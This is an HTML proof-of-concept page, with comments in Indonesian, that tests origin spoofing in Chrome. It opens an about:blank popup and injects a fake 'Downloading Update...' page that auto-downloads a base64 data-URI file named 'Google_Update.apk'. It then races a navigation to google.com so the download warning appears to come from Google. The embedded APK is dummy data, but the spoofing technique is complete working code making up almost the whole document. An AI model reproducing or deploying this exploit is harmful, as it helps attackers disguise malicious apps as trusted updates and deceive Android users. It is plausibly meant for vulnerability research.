<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Origin Spoofing - APK Download Test</title>
    <style>
        body { font-family: sans-serif; padding: 30px; background: #f4f4f9; }
        .box { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; border: 1px solid #ddd; }
        button { 
            background: #28a745; color: white; border: none; padding: 15px; 
            width: 100%; font-size: 16px; border-radius: 5px; cursor: pointer; 
        }
        pre { background: #000; color: #0f0; padding: 10px; margin-top: 20px; font-size: 12px; }
    </style>
</head>
<body>

<div class="box">
    <h3>APK Origin Spoofing Test</h3>
    <p>PoC ini akan mencoba memicu unduhan file <code>.apk</code> melalui <code>about:blank</code> lalu navigasi ke domain target.</p>
    <button id="go">Jalankan Pengujian</button>
    <pre id="log">Status: Ready</pre>
</div>

<script>
const log = m => document.getElementById("log").textContent += "\n> " + m;

document.getElementById("go").onclick = () => {
    log("Memulai...");

    // 1. Buka popup about:blank
    const w = window.open("about:blank", "poc_window", "width=600,height=400");
    
    if(!w) {
        log("Error: Popup diblokir!");
        return;
    }

    // 2. Payload APK (Minimal valid APK structure atau dummy data)
    // Di sini kita gunakan base64 dari string dummy untuk simulasi file .apk
    const apkData = "data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAAG1ldGEtaW5mL1BLAwQUAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAYW5kcm9pZG1hbmlmZXN0LnhtbFBLAQIUAxQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAACAAAAAbWV0YS1pbmYvUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAAAAMAAAAAYW5kcm9pZG1hbmlmZXN0LnhtbFBLBQYAAAAAAgACAHAAAABkAAAAAAA=";

    // 3. Injeksi ke about:blank
    w.document.write(`
        <html>
        <body>
            <p>Downloading Update...</p>
            <a id="link" href="data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAAG1ldGEtaW5mL1BLAwQUAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAYW5kcm9pZG1hbmlmZXN0LnhtbFBLAQIUAxQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAACAAAAAbWV0YS1pbmYvUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAAAAMAAAAAYW5kcm9pZG1hbmlmZXN0LnhtbFBLBQYAAAAAAgACAHAAAABkAAAAAAA=" download="Google_Update.apk"></a>
            <script>
                setTimeout(() => {
                    document.getElementById('link').click();
                }, 3000);
            <\/script>
        </body>
        </html>
    `);

    // 4. Navigasi Cepat (Race Condition)
    // Sesuaikan timer (100ms - 500ms) untuk menangkap momen UI Rendering
    setTimeout(() => {
        try {
            w.location.href = "https://www.google.com";
            log("Navigasi ke Google dilakukan.");
            log("Cek dialog peringatan 'File ini berbahaya' di Chrome.");
        } catch(e) {
            log("Navigasi gagal: " + e);
        }
    }, 200);
};
</script>

</body>
</html>
